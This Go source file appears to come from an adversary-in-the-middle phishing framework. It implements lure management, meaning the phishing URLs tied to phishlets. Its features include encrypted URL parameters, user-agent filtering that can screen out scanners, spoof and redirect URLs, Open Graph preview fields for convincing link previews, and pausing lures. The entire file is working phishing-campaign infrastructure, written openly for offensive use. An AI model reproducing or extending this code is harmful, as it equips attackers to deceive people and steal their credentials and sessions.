package aitm

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"errors"
	"io"
	"regexp"
	"strings"
	"time"
)

// LureStore is the persistence interface required by LureService.
type LureStore interface {
	CreateLure(l *Lure) error
	GetLure(id string) (*Lure, error)
	UpdateLure(l *Lure) error
	DeleteLure(id string) error
	ListLures() ([]*Lure, error)
}

// Lure is a configured phishing URL instance tied to a specific phishlet.
type Lure struct {
	ID          string
	Phishlet    string
	BaseDomain  string // overrides global domain if set
	Hostname    string
	Path        string
	RedirectURL string
	SpoofURL    string
	UAFilter    string // raw regex; empty means accept all
	uaFilter    *regexp.Regexp
	PausedUntil time.Time
	OGTitle     string
	OGDesc      string
	OGImage     string
	OGURL       string
	Redirector  string
	ParamsKey   []byte // 32-byte AES-256-GCM key, generated at creation
}

func (l *Lure) IsPaused() bool {
	return !l.PausedUntil.IsZero() && time.Now().Before(l.PausedUntil)
}

func (l *Lure) MatchesUA(ua string) bool {
	if l.uaFilter == nil {
		return true
	}
	return l.uaFilter.MatchString(ua)
}

// CompileUA compiles the UAFilter regex. Must be called after loading from storage.
func (l *Lure) CompileUA() error {
	if l.UAFilter == "" {
		l.uaFilter = nil
		return nil
	}
	re, err := regexp.Compile(l.UAFilter)
	if err != nil {
		return err
	}
	l.uaFilter = re
	return nil
}

// GenerateURL builds the phishing URL, optionally embedding AES-256-GCM encrypted
// custom parameters as a base64url query value.
func (l *Lure) GenerateURL(baseDomain string, params map[string]string) (string, error) {
	host := l.Hostname
	if host == "" {
		host = baseDomain
	}
	base := "https://" + host + l.Path
	if len(params) == 0 || len(l.ParamsKey) == 0 {
		return base, nil
	}
	enc, err := encryptParams(l.ParamsKey, params)
	if err != nil {
		return "", err
	}
	return base + "?p=" + enc, nil
}

// DecryptParams decodes and decrypts the ?p= query value from a lure URL.
func (l *Lure) DecryptParams(token string) (map[string]string, error) {
	if len(l.ParamsKey) == 0 || token == "" {
		return map[string]string{}, nil
	}
	return decryptParams(l.ParamsKey, token)
}

func encryptParams(key []byte, params map[string]string) (string, error) {
	var sb strings.Builder
	for k, v := range params {
		sb.WriteString(k + "=" + v + "\n")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ct := gcm.Seal(nonce, nonce, []byte(sb.String()), nil)
	return base64.RawURLEncoding.EncodeToString(ct), nil
}

func decryptParams(key []byte, encoded string) (map[string]string, error) {
	ct, err := base64.RawURLEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	if len(ct) < gcm.NonceSize() {
		return nil, errors.New("ciphertext too short")
	}
	plain, err := gcm.Open(nil, ct[:gcm.NonceSize()], ct[gcm.NonceSize():], nil)
	if err != nil {
		return nil, err
	}
	out := make(map[string]string)
	for line := range strings.SplitSeq(string(plain), "\n") {
		k, v, ok := strings.Cut(line, "=")
		if ok {
			out[k] = v
		}
	}
	return out, nil
}

// LureService owns all business logic for lure management.
type LureService struct {
	store LureStore
	bus   EventBus
}

func NewLureService(store LureStore, bus EventBus) *LureService {
	return &LureService{store: store, bus: bus}
}

func (s *LureService) Create(l *Lure) error {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return err
	}
	l.ParamsKey = key
	return s.store.CreateLure(l)
}

func (s *LureService) Get(id string) (*Lure, error) { return s.store.GetLure(id) }
func (s *LureService) Update(l *Lure) error         { return s.store.UpdateLure(l) }
func (s *LureService) Delete(id string) error       { return s.store.DeleteLure(id) }
func (s *LureService) List() ([]*Lure, error)       { return s.store.ListLures() }

func (s *LureService) Pause(id string, d time.Duration) error {
	l, err := s.store.GetLure(id)
	if err != nil {
		return err
	}
	l.PausedUntil = time.Now().Add(d)
	return s.store.UpdateLure(l)
}

func (s *LureService) Unpause(id string) error {
	l, err := s.store.GetLure(id)
	if err != nil {
		return err
	}
	l.PausedUntil = time.Time{}
	return s.store.UpdateLure(l)
}
